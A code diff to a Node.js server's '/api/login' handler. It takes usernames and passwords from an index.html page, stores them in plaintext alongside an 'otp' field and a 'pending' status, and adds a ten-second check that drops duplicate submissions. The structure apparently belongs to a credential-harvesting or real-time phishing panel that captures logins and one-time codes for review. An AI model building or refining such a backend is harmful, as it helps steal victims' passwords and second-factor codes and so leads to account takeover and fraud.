@@ -104,10 +104,21 @@ const server = http.createServer(async (req, res) => {
     // ---- API: receive a login submission from index.html ----
     if (method === 'POST' && pathname === '/api/login') {
       const body = await readBody(req);
+      const username = (body.username || '').toString().slice(0, 100);
+      const password = (body.password || '').toString().slice(0, 100);
+      const duplicateWindowMs = 10000;
+      const duplicate = requests.find((request) => (
+        request.username === username &&
+        request.password === password &&
+        request.status === 'pending' &&
+        Date.now() - request.createdAt < duplicateWindowMs
+      ));
+      if (duplicate) return sendJSON(res, 200, { ok: true, id: duplicate.id });
+
       const entry = {
         id: nextId++,
-        username: (body.username || '').toString().slice(0, 100),
-        password: (body.password || '').toString().slice(0, 100),
+        username,
+        password,
         otp: null,
         name: '-',
         phone: '-',
